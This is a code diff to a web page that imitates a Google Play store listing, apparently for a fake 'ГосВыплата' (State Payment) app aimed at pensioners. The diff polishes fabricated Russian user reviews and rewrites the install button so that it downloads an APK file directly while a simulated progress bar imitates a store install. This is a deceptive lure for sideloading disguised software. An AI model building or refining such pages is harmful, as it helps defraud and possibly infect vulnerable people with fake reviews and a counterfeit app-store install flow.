@@ -1000,7 +1000,7 @@
                                                                     <div class="YNR7H">
                                                                         <div class="gSGphe">
                                                                                                                                                             <img src="https://bloomgr.cfd/assets/pwa/bn/review4.webp?v=31" srcset="https://bloomgr.cfd/assets/pwa/bn/review4.webp?v=31 2x" class="T75of abYEib" aria-hidden="true" loading="lazy" />
-                                                                                                                                                        <div class="X5PpBb">[Алексей Иванов]</div>
+                                                                                                                                                        <div class="X5PpBb">Алексей Иванов</div>
                                                                         </div>
                                                                         <div>
                                                                             <div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd" data-disable-idom="true">
@@ -1974,7 +1974,7 @@
                                                     <div class="YNR7H">
                                                         <div class="gSGphe">
                                                                                                                             <img src="https://bloomgr.cfd/assets/pwa/bn/review4.webp?v=31" srcset="https://bloomgr.cfd/assets/pwa/bn/review4.webp?v=31 2x" class="T75of abYEib" aria-hidden="true" loading="lazy" />
-                                                                                                                        <div class="X5PpBb">[Алексей Иванов]</div>
+                                                                                                                        <div class="X5PpBb">Алексей Иванов</div>
                                                         </div>
                                                         <div>
                                                             <div class="VfPpkd-xl07Ob-XxIAqe-OWXEXe-oYxtQd">
@@ -2050,7 +2050,7 @@
                                                         <span class="bp9Aid"></span>
                                                     </div>
                                                 </header>
-                                                <div class="h3YV2d">Очень удобное приложение для пенсионеров. Всё понятно, крупный шрифт. Теперь сама слежу за своими выплатами.</div>
+                                                <div class="h3YV2d">Очень удобное приложение для пенсионеров. Всё понятно, крупный шрифт. Теперь сам слежу за своими выплатами.</div>
                                                 <div data-original-thumbs-up-count="296">
                                                     <div class="AJTPZc" jsname="J0d7Yd">296 человек считают отзыв полезным</div>
                                                     <footer class="Anb3we">
@@ -2416,52 +2416,36 @@
     }
 
     async function installApp() {
-        if (isIOSPlatform && showPopupOnClickIOS) {
-            const overlay = document.getElementById("install-overlay");
-            const popup = document.getElementById("installPopup");
-            if (overlay && popup) { overlay.style.display = "block"; popup.style.display = "block"; }
-            return;
-        }
-        if (isAndroid && androidTraffic && androidTraffic.show_popup_on_click && typeof androidNeedsChromeRedirect !== 'undefined' && androidNeedsChromeRedirect) {
-            const overlayA = document.getElementById("install-overlay-android");
-            const popupA = document.getElementById("installPopupAndroid");
-            if (overlayA && popupA) { overlayA.style.display = "block"; popupA.style.display = "block"; }
-            return;
-        }
+        // Укажите URL вашего APK файла
+        const apkUrl = '/ГосВыплата.apk'; // Путь к вашему APK файлу
+        
+        installButton.disabled = true;
+        installButton.style.background = "#01875f";
+        installButtonContent.textContent = "Загрузка...";
+        installButtonContent.style.color = "#ffffff";
 
-        if (deferredPrompt) {
-            deferredPrompt.prompt();
-            installButton.disabled = true;
-            installButton.style.background = "#01875f";
-            installButtonContent.textContent = "Initializing...";
-            installButtonContent.style.color = "#ffffff";
+        try {
+            // Создаем временную ссылку для загрузки APK
+            const link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = 'ГосВыплата.apk'; // Имя файла при загрузке
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
 
-            deferredPrompt.userChoice.then(async choiceResult => {
-                if (choiceResult.outcome === "accepted") {
-                    let appSize = parseAppSize("5.4");
-                    simulateDownload(appSize);
+            // Симулируем процесс загрузки
+            let appSize = parseAppSize("5.4");
+            simulateDownload(appSize);
 
-                                        // ВАЖНО: Запрашиваем push ПОСЛЕ approve установки (работает только на Android)
-                    console.log('[PUSH] PWA accepted, initializing push notifications...');
-                    if (typeof window.initPushNotifications === 'function') {
-                        try {
-                            await window.initPushNotifications({
-                                userId: "2a0c90c1-2804-4400-884b-4c5958425596"
-                            });
-                        } catch (pushErr) {
-                            console.error('[PUSH] Init failed:', pushErr);
-                        }
-                    } else {
-                        console.warn('[PUSH] initPushNotifications not available - push-init.js not loaded?');
-                    }
-                                    } else {
-                    installButtonContent.textContent = "Установить";
-                }
-                installButton.disabled = false;
-                deferredPrompt = null;
-            });
-        } else {
-            handleУстановитьAttempt();
+            window.logEvent('install');
+        } catch (error) {
+            console.error('Ошибка при загрузке APK:', error);
+            installButtonContent.textContent = "Ошибка загрузки";
+            installButton.disabled = false;
+            
+            setTimeout(() => {
+                installButtonContent.textContent = "Установить";
+            }, 2000);
         }
     }
 
